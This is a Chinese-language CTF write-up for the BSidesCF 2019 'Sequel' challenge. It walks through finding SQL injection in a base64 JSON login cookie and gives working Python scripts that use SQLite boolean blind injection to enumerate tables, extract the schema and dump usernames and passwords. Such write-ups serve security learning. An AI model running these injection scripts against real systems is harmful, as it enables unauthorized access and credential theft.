# \[BSidesCF 2019]Sequel

## \[BSidesCF 2019]Sequel

## 考点

* sqlite3盲注

## wp

登录页面，随便输提示`Username must be alphanumeric.`

![](<../.gitbook/assets/image (31).png>)

弱口令爆破，guest/guest，登录后提示数据库

![](<../.gitbook/assets/image (5).png>)

抓包发现cookie是`1337_AUTH=eyJ1c2VybmFtZSI6Imd1ZXN0IiwicGFzc3dvcmQiOiJndWVzdCJ9`

base64解码是`{"username":"guest","password":"guest"}`，这里可能存在注入

改成`{"username":"guest'#","password":"guest"}`，提示Invalid user.

改成`{"username":"guest"#","password":"guest"}`，提示Server Error

`"`加个转义符试试，`{"username":"guest\"#","password":"guest"}`，还提示Invalid user.

把`#`改成`--`，`{"username":"guest\"--","password":"guest"}`，成功登录

`{"username":"\" or 1=1--","password":"guest"}`，成功登录

盲注脚本如下

```python
#coding=utf-8 
import requests
import base64
import time
url = 'http://60973c61-7d7e-406d-8b6d-4cdce6d2c6d5.node4.buuoj.cn:81/sequels'
s = requests.session()
flag = ''
table = " ,0123456789_abcdefghijklmnopqrstuvwxyz"
for i in range(1, 50):
    print(flag)
        
    low = 0
    high = 38
    mid = (low+high)//2
    while low < high:
        payload = '{"username":"\\" or 1=((substr((select name from sqlite_master where type=\\"table\\" limit 1 offset 0),'+str(i)+',1))>\\"'+table[mid]+'\\")--","password":"guest"}'
        #  print(payload)
        cookies = {
            '1337_AUTH': base64.b64encode(payload.encode()).decode(),
        }
    
        r = s.get(url=url, cookies=cookies)
        time.sleep(0.3)
        
        # true
        if len(r.text) > 3400:
            low = mid + 1
        # false
        if 'Invalid user' in  r.text:
            high = mid
        mid = (low+high)//2
            
        if low == high:
            flag = flag + table[low]
            break
```

得到表userinfo，reviews，notes

由于sqlite3在进行字符比较时不区分大小写，所以在注入字段时不能用二分法，同时可能会有不可见字符，所以对结果进行hex编码然后再布尔盲注判断字符

```python
#coding=utf-8 
import requests
import base64
import time
url = 'http://58104486-6db8-40ed-9632-8897a13ff8ae.node4.buuoj.cn:81/sequels'
s = requests.session()
flag = ''
table = '0123456789ABCDEF'
for i in range(1, 5000):
    print(flag)
        
    for j in table:
        
        payload = '{"username":"\\" or 1=(substr((select hex(sql) from sqlite_master where type=\\"table\\" and name=\\"userinfo\\" limit 1 offset 0),'+str(i)+',1)=\\"'+j+'\\")--","password":"guest"}'

        cookies = {
            '1337_AUTH': base64.b64encode(payload.encode()).decode(),
        }
        print(payload)
        r = s.get(url=url, cookies=cookies)
        time.sleep(0.3)
        print(r.text)
        # true
        if len(r.text) > 3400:
            flag = flag + j
            break
        # false
        if 'Invalid user' in  r.text:
            continue
 
```

结果

```sql
CREATE TABLE userinfo (
                        username text not null primary key,
                        password text not null)
```

然后注入，得到用户名密码

```python
#coding=utf-8 
import requests
import base64
import time
url = 'http://58104486-6db8-40ed-9632-8897a13ff8ae.node4.buuoj.cn:81/sequels'
s = requests.session()
flag = ''
table = '0123456789ABCDEF'
for i in range(1, 5000):
    print(flag)
        
    for j in table:
        
        payload = '{"username":"\\" or 1=(substr((select hex(group_concat(username)) from userinfo),'+str(i)+',1)=\\"'+j+'\\")--","password":"guest"}'

        cookies = {
            '1337_AUTH': base64.b64encode(payload.encode()).decode(),
        }
        #print(payload)
        r = s.get(url=url, cookies=cookies)
        time.sleep(0.3)
        #print(r.text)
        # true
        if 'No note for' in r.text:
            flag = flag + j
            break
        # false
        if 'Invalid user' in  r.text:
            continue
 
```

结果如下

```
guest,sequeladmin
guest,f5ec3af19f0d3679e7d5a148f4ac323d
```

![](<../.gitbook/assets/image (22) (1).png>)

## 小结

sqlite3注入

1. 找表`select name from sqlite_master where type="table"`，需要限制输出的话是`select name from sqlite_master where type="table" limit 1 offset 0`，修改offset，从0开始，如果超过表的数量会返回错误
2. 找字段`select sql from sqlite_master where type="table" and name="userinfo"`
3. 盲注考虑编码再注入，避免很多不必要的麻烦
